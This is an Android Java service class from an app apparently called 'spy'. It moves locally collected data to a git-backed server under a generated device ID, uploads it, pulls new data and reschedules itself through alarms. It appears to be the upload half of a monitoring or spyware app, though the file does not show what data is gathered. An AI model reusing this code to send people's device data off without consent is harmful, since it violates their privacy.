package com.gameofcoding.spy.services;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import com.gameofcoding.spy.R;
import com.gameofcoding.spy.receivers.UploaderAlarm;
import com.gameofcoding.spy.utils.NotificationUtils;
import com.gameofcoding.spy.utils.XLog;
import com.gameofcoding.spy.utils.Utils;
import com.gameofcoding.spy.io.FileManager;
import com.gameofcoding.spy.io.ServerFilePaths;
import org.eclipse.jgit.api.errors.GitAPIException;
import com.gameofcoding.spy.server.ServerManager;
import com.gameofcoding.spy.server.Server;

public class UploaderService extends Service {
    private static final String TAG = "UploaderService";
    private static final int UPLOADER_SERVICE_NOTIF_ID = 1;
    private Context mContext;
    private Utils mUtils;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    @Override
    public void onCreate() {
	super.onCreate();
	XLog.v(TAG, "UploaderService has been started, preparing for uploading data.");
	mContext = getApplicationContext();
	mUtils = new Utils(mContext);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
	// XXX: Only for debugging
	updateForegroundNotif("Getting repo...");
	new Thread() {
	    @Override
	    public void run() {
		FileManager fm = new FileManager(mContext);
		if(fm.moveDataToServer()) {
		    // Clean all previous data present in device dir
		    ServerFilePaths serverFilePaths = ServerFilePaths.loadPaths(mContext);
		    if(serverFilePaths == null) {
			XLog.e(TAG, "Could not load server file paths, it is null (Aborting upload)");
			XLog.i(TAG, "Data could not be moved from 'user_dir' to 'server_dir',"
			       + "we would try again later");
			// Stop service
			stopForeground(true);
			stopSelf();
			return;
		    }
		    ServerManager serverMaanager = new ServerManager(serverFilePaths.getRootDir(),
								     new Utils(mContext).generateDeviceId());
		    Server server;
		    boolean stopAlarm = true;
		    try {
			XLog.i(TAG, "Loading server...");
			if((server = serverMaanager.loadServer()) != null) {
			    XLog.i(TAG, "Server loaded saving changes...");
			    Server.Directory dirDevice = null;
			    if((dirDevice = server.openDir(Server.Dir.DEVICE)) != null) {
				if(dirDevice.saveChanges()) {
				    XLog.i(TAG, "Changes saved! Preparing for upload");
				    if(dirDevice.uploadData()) {
					XLog.i(TAG, "Data uploaded!");
					XLog.i(TAG, "Downloading data for something new...");
					if(server.reloadData()) {
					    XLog.i(TAG, "Data reloaded successfully...");
					} else {
					    XLog.w(TAG, "Could not reload data, aborting upload...");
					    stopAlarm = false;
					}
				    } else {
					XLog.w(TAG, "Could not upload data, aborting upload...");
				    }
				} else {
				    XLog.w(TAG, "Changes could not be saved, aborting upload...");
				    stopAlarm = false;
				}
			    } else {
				XLog.w(TAG, "Failed to open device directory in server! Aborting upload...");
				stopAlarm = false;
			    }
			} else {
			    XLog.w(TAG, "Aborting alarm. Server is null, it should'nt happen.");
			    stopAlarm = false;
			}
		    } catch(GitAPIException e) {
			XLog.e(TAG, "Exception occured while working with server, aborting upload...", e);
			stopAlarm = false;
		    }

		    if(stopAlarm) {
			// Stopping alarm
			XLog.i(TAG, "Uploaded and downloaded successfully!, stopping 'UploaderAlarm' alarm.");
			AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
			PendingIntent pendingIntent = PendingIntent
			    .getBroadcast(mContext, 0, new Intent(mContext, UploaderAlarm.class), 0);
			alarmManager.cancel(pendingIntent);
		    } else {
			// Wait for next time
			XLog.i(TAG, "Data not uploaded successfully, we would try again later");
		    }
		} else {
		    XLog.i(TAG, "Data could not be moved from 'user_dir' to 'server_dir',"
			   + "we would try again later");
		}
		// Stop service
		stopForeground(true);
		stopSelf();
	    }
	}.start();
	// TODO:
	// 1: Check app update
	// 2: if(update) send update Notif
	// 3: Check if changes has been done
	// 5: if(Changes) Upload changes
	// 6: if(Changes & uploaded unsuccessfully) return error
	// 7: Pull new changes
	// 8: Goto 1 and 2
	// 9: If all went right then stop alarm

        return START_STICKY;
    }

    @SuppressWarnings("deprecation")
    public void updateForegroundNotif(String contentText) {
	Notification.Builder notifBuilder = null;
	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
	    NotificationUtils notifUtils = new NotificationUtils(mContext);
	    notifUtils.createDefaultNotifChannel();
	    String channelID = notifUtils.getDefaultNotifChannelId();
	    notifBuilder = new Notification.Builder(mContext, channelID);
	} else {
	    notifBuilder = new Notification.Builder(mContext);
	}

	// Start foreground notification
	notifBuilder.setContentTitle(getString(R.string.uploaderservice_notif_content_title))
	    .setContentText(contentText)
	    .setSmallIcon(R.mipmap.ic_launcher);
	startForeground(UPLOADER_SERVICE_NOTIF_ID, notifBuilder.build());
    }
}
